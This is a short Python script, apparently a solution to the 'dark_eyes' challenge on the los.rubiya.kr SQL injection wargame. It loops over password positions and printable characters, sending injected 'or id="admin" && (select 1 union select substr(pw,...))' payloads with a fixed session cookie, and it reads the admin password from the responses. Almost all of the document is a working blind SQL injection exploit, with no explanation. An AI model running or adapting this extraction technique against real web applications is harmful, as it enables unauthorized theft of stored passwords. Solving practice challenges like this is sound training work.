import requests
import string

a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
cookies = {'PHPSESSID':'mfe678u3oapuf0q6du218a88md'}
for j in range(1,9):
    for i in a:
        url="https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=%27or%20id=%22admin%22%20%26%26%20(select%201%20union%20select%20(substr(pw,"+str(j)+",1)=\""+str(i)+"\"))--%20-"
        res = requests.get(url,cookies=cookies)
        res = res.text
        if "admin" in res:
            print("%d : %c" % (j,i))
            break
        else: pass